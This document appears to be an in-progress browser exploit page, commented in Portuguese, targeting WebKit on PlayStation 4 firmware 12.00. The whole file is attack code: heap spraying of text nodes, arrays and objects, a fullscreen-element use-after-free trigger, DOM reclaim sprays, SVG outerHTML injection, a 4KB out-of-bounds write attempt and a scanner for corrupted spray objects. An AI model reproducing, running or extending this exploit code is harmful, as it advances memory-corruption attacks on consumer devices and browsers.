<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Common Object Overlap</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → FastMalloc → Common JS Object Scan</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg){
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// 🌍 HEAP FENG SHUI (ATUALIZADO SEM FLOAT64ARRAY)
function setupInterleavedFengShui(){
    log("[*] Iniciando Interleaved Spray (Array/Objeto)...");

    window.dom_spray = [];
    window.heap_spray = []; // Agora são Arrays Comuns
    window.obj_spray = [];  // Agora são Objetos Literais

    for(let i=0; i<6000; i++){
        // 1. Isca DOM (Buffer de texto um pouco maior para parear com a corrupção)
        let t = document.createTextNode("TXT_BAIT_" + i + "_" + "B".repeat(0x80));
        document.body.appendChild(t);
        window.dom_spray.push(t);

        // 2. Isca de Array Normal do JS (Fora do Gigacage!)
        let normal_array = [0x1337, i, 0x1337, i];
        window.heap_spray.push(normal_array);

        // 3. Isca de Objeto JS Literal
        let normal_obj = { signature: 0x1337, id: i, payload: "ISCA" };
        window.obj_spray.push(normal_obj);
    }

    log("[*] Spray de Objetos Comuns concluído!");
}

// ==========================
// HEAP SETUP ORIGINAL (100% INALTERADO - Mantém a pressão do bug)
function setupHeap(){
    let arr=[];
    for(let i=0;i<5000;i++){
        let a=new Float64Array(8);
        a[0]=i;
        arr.push(a);
    }
    return arr;
}

// ==========================
// FULLSCREEN (100% INALTERADO)
function setupFullscreen(){
    let fsTarget=document.createElement("div");
    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
    Object.assign(fsTarget.style,{
        background:"black", width:"100%", height:"100%", position:"absolute", top:"0", left:"0"
    });
    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();
    return fsTarget;
}

// ==========================
// 💣 RECLAIM (100% INALTERADO)
function reclaim(size){
    log("[*] Reclaim size = " + size);
    for(let i=0;i<3000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }
    for(let i=0;i<size;i++){
        let e=document.createElement("div");
        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
        document.body.appendChild(e);
    }
}

// ==========================
// 💥 SVG CONFUSION (100% INALTERADO)
function inject(child){
    try{
        child.outerHTML = `
        <svg>
            <foreignObject width="100%" height="100%">
                <div xmlns="http://www.w3.org/1999/xhtml">AAAA</div>
            </foreignObject>
        </svg>`;
        log("[*] payload injected");
    }catch(e){
        log("[UAF] inject crash");
    }
}

// ==========================
// 🔬 PROBE ATUALIZADO PARA OBJETOS COMUNS
function domOverlapProbe(fsTarget){
    log("---- PROBE DE OBJETOS COMUNS ----");

    try{
        let n = fsTarget.firstChild;
        if(!n) return;

        if(n.nodeType === 3){
            log("[!!!] TEXTNODE CONFUSION");

            // 💣 DISPARA O TIRO LONGO (4KB de "A"s)
            try{
                n.data = "A".repeat(0x1000); 
                log("[PWN] Escrita OOB disparada (4KB)");
            }catch(e){
                log("[UAF] write crash");
            }

            // ==========================
            // 🔥 SCANNER
            try{
                // 1. Checa as Iscas de Array Normal
                for(let i=0; i<window.heap_spray.length; i++){
                    if(window.heap_spray[i][0] !== 0x1337){
                        log("[$$$] JACKPOT JSC! Array normal corrompido @ " + i);
                        return;
                    }
                }

                // 2. Checa as Iscas de Objetos Literais
                for(let i=0; i<window.obj_spray.length; i++){
                    if(window.obj_spray[i].signature !== 0x1337){
                        log("[$$$] JACKPOT JSC! Objeto literal corrompido @ " + i);
                        return;
                    }
                }

                // 3. Checa o próprio DOM TextNode vizinho
                for(let i=0; i<window.dom_spray.length; i++){
                    let txt = window.dom_spray[i].data;
                    if(!txt || !txt.includes("TXT_BAIT_")){
                        log("[!!!] DOM TextNode Vizinho corrompido @ " + i);
                        return;
                    }
                }

                log("[SCAN] Nada atingido ainda...");

            }catch(e){
                log("[UAF] scan crash");
            }
        }
    }catch(e){
        log("[UAF] probe crash");
    }
}

// ==========================
// TRIGGER (100% INALTERADO)
function trigger(fsTarget){
    log("[*] Trigger");
    try{
        fsTarget.remove();
        if(document.webkitIsFullScreen || document.fullscreenElement) document.webkitExitFullscreen?.();
    }catch(e){}

    let sizes=[1500,2000,2500,3000];
    sizes.forEach((s,i)=>{
        setTimeout(()=>reclaim(s), i*50);
    });

    setTimeout(()=>{
        try{
            let child = fsTarget.firstChild;
            if(child) inject(child);
        }catch(e){}
    }, 30);

    setTimeout(()=>domOverlapProbe(fsTarget), 80);
    setTimeout(()=>domOverlapProbe(fsTarget), 180);
    setTimeout(()=>domOverlapProbe(fsTarget), 280);

    setTimeout(()=>{ alert(logBuffer.join("\n")); }, 450);
    setTimeout(()=>location.reload(), 600);
}

// ==========================
// MAIN
function runTest(){
    log("[*] Iniciando teste...");
    
    // Executa a pressão de memória obrigatória que você descobriu (Float64Array intocável)
    window.heap_press = setupHeap(); 

    // Aloca nossas novas iscas fracas!
    setupInterleavedFengShui(); 

    let fsTarget=setupFullscreen();
    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
